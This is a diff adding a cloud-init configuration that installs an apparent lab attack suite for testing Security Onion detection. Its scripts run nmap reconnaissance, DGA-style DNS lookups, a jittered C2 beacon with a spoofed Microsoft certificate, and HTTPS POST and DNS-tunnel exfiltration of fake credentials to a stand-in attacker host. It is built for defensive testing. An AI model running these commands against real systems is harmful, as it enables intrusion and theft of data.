@@ -1,0 +1,180 @@
+#cloud-config
+package_update: true
+package_upgrade: true
+
+packages:
+  - nmap
+  - curl
+  - wget
+  - dnsutils
+  - python3-pip
+  - netcat-openbsd
+  - tcpdump
+  - openssl
+  - jq
+
+write_files:
+  - path: /home/labadmin/attacks/01_recon.sh
+    permissions: '0755'
+    content: |
+      #!/bin/bash
+      VICTIM_IP="${1:-10.0.2.30}"
+      echo "[$(date -u)] === STAGE 1: RECONNAISSANCE ==="
+      echo "[*] SYN scan against $VICTIM_IP"
+      nmap -sS -sV -p 22,80,443,8080,3306,5432 $VICTIM_IP -oN /tmp/recon_syn.txt
+      echo "[*] Aggressive scan"
+      nmap -A -T4 $VICTIM_IP -oN /tmp/recon_aggressive.txt
+      echo "[*] UDP top ports"
+      nmap -sU --top-ports 20 $VICTIM_IP -oN /tmp/recon_udp.txt
+      echo "[$(date -u)] === RECON COMPLETE ==="
+
+  - path: /home/labadmin/attacks/02_malicious_traffic.sh
+    permissions: '0755'
+    content: |
+      #!/bin/bash
+      echo "[$(date -u)] === STAGE 2: MALICIOUS TRAFFIC ==="
+      DGA_DOMAINS=(
+        "xk7qm3.evil-example.com" "b9zp4w.malware-test.net"
+        "r3k8m2.suspicious-domain.org" "q7w9x1.bad-actor.com"
+        "m4p6n8.threat-sim.net" "j2v5t3.dga-example.org"
+        "y8h1k6.c2-callback.com" "f5d9w4.exfil-test.net"
+      )
+      echo "[*] DGA-style DNS queries"
+      for domain in "${DGA_DOMAINS[@]}"; do
+        dig +short $domain 2>/dev/null
+        sleep 0.5
+      done
+      echo "[*] HTTP requests with suspicious user-agents"
+      USER_AGENTS=(
+        "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trojan.Agent)"
+        "Wget/1.0 (linux)"
+        "Python-urllib/3.8"
+      )
+      for ua in "${USER_AGENTS[@]}"; do
+        curl -s -o /dev/null -A "$ua" http://10.0.2.30/ 2>/dev/null
+        sleep 1
+      done
+      echo "[$(date -u)] === MALICIOUS TRAFFIC COMPLETE ==="
+
+  - path: /home/labadmin/attacks/03_c2_beacon.sh
+    permissions: '0755'
+    content: |
+      #!/bin/bash
+      ATTACKER_IP="10.0.2.20"
+      VICTIM_IP="${1:-10.0.2.30}"
+      BEACON_COUNT="${2:-10}"
+      INTERVAL=60
+      JITTER=6
+      echo "[$(date -u)] === STAGE 3: C2 BEACON SIMULATION ==="
+      echo "[*] Generating self-signed cert for C2"
+      openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2.key -out /tmp/c2.crt \
+        -days 1 -nodes -subj "/CN=update.microsoft-cdn.com" 2>/dev/null
+      echo "[*] Starting HTTPS listener on port 8443"
+      while true; do
+        echo "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK" | \
+          openssl s_server -key /tmp/c2.key -cert /tmp/c2.crt -accept 8443 -quiet 2>/dev/null &
+        LISTENER_PID=$!
+        sleep 2
+        break
+      done
+      echo "[*] Simulating beacon callbacks ($BEACON_COUNT iterations, ${INTERVAL}s interval)"
+      for i in $(seq 1 $BEACON_COUNT); do
+        SLEEP_JITTER=$((INTERVAL + RANDOM % (JITTER * 2) - JITTER))
+        curl -sk https://${ATTACKER_IP}:8443/beacon?id=$(hostname)_${i} \
+          -H "X-Session: $(openssl rand -hex 16)" \
+          -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 2>/dev/null
+        echo "  [beacon $i/$BEACON_COUNT] next in ${SLEEP_JITTER}s"
+        sleep $SLEEP_JITTER
+      done
+      kill $LISTENER_PID 2>/dev/null
+      echo "[$(date -u)] === C2 BEACON COMPLETE ==="
+
+  - path: /home/labadmin/attacks/04_exfil_sim.sh
+    permissions: '0755'
+    content: |
+      #!/bin/bash
+      ATTACKER_IP="10.0.2.20"
+      echo "[$(date -u)] === STAGE 4: EXFILTRATION SIMULATION ==="
+      echo "[*] Creating fake sensitive data"
+      cat > /tmp/fake_creds.txt << 'CREDS'
+      admin:P@ssw0rd123!
+      dbadmin:Sup3rS3cret
+      api_key:sk-fake-1234567890abcdef
+      CREDS
+      dd if=/dev/urandom bs=1024 count=500 2>/dev/null | base64 > /tmp/fake_db_dump.sql
+      echo "[*] Exfiltrating via HTTPS POST"
+      openssl req -x509 -newkey rsa:2048 -keyout /tmp/exfil.key -out /tmp/exfil.crt \
+        -days 1 -nodes -subj "/CN=cdn-static.cloudfront.net" 2>/dev/null
+      echo "HTTP/1.1 200 OK\r\n\r\n" | \
+        openssl s_server -key /tmp/exfil.key -cert /tmp/exfil.crt -accept 9443 -quiet 2>/dev/null &
+      EXFIL_PID=$!
+      sleep 2
+      curl -sk -X POST https://${ATTACKER_IP}:9443/upload \
+        -d @/tmp/fake_creds.txt -H "Content-Type: application/octet-stream" 2>/dev/null
+      curl -sk -X POST https://${ATTACKER_IP}:9443/sync \
+        -d @/tmp/fake_db_dump.sql -H "Content-Type: application/octet-stream" 2>/dev/null
+      echo "[*] DNS tunneling simulation"
+      for i in $(seq 1 20); do
+        ENCODED=$(echo "exfil-data-chunk-$i" | base64 | tr -d '=' | tr '+/' '-_')
+        dig +short ${ENCODED}.tunnel.evil-example.com 2>/dev/null
+        sleep 0.2
+      done
+      kill $EXFIL_PID 2>/dev/null
+      rm -f /tmp/fake_creds.txt /tmp/fake_db_dump.sql
+      echo "[$(date -u)] === EXFILTRATION COMPLETE ==="
+
+  - path: /home/labadmin/attacks/run_all.sh
+    permissions: '0755'
+    content: |
+      #!/bin/bash
+      VICTIM_IP="10.0.2.30"
+      SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+      DRY_RUN=false
+      STAGE=""
+      while [[ $# -gt 0 ]]; do
+        case $1 in
+          --dry-run) DRY_RUN=true; shift ;;
+          --stage)   STAGE="$2"; shift 2 ;;
+          --victim)  VICTIM_IP="$2"; shift 2 ;;
+          *)         echo "Usage: $0 [--dry-run] [--stage recon|malicious|c2|exfil] [--victim IP]"; exit 1 ;;
+        esac
+      done
+      run_stage() {
+        local name=$1 script=$2; shift 2
+        echo ""
+        echo "╔══════════════════════════════════════╗"
+        echo "║  $name"
+        echo "╚══════════════════════════════════════╝"
+        if $DRY_RUN; then
+          echo "  [DRY RUN] Would execute: $script $@"
+        else
+          bash "$script" "$@"
+        fi
+      }
+      echo "═══════════════════════════════════════════"
+      echo "  Security Onion AI Demo — Attack Suite"
+      echo "  Target: $VICTIM_IP | Time: $(date -u)"
+      echo "═══════════════════════════════════════════"
+      if [ -z "$STAGE" ] || [ "$STAGE" = "recon" ]; then
+        run_stage "Stage 1: Reconnaissance" "$SCRIPT_DIR/01_recon.sh" $VICTIM_IP
+        [ -z "$STAGE" ] && sleep 10
+      fi
+      if [ -z "$STAGE" ] || [ "$STAGE" = "malicious" ]; then
+        run_stage "Stage 2: Malicious Traffic" "$SCRIPT_DIR/02_malicious_traffic.sh"
+        [ -z "$STAGE" ] && sleep 10
+      fi
+      if [ -z "$STAGE" ] || [ "$STAGE" = "c2" ]; then
+        run_stage "Stage 3: C2 Beacon" "$SCRIPT_DIR/03_c2_beacon.sh" $VICTIM_IP 5
+        [ -z "$STAGE" ] && sleep 5
+      fi
+      if [ -z "$STAGE" ] || [ "$STAGE" = "exfil" ]; then
+        run_stage "Stage 4: Exfiltration" "$SCRIPT_DIR/04_exfil_sim.sh"
+      fi
+      echo ""
+      echo "═══════════════════════════════════════════"
+      echo "  Complete: $(date -u)"
+      echo "  Check Security Onion SOC console for alerts"
+      echo "═══════════════════════════════════════════"
+
+runcmd:
+  - chown -R labadmin:labadmin /home/labadmin/attacks
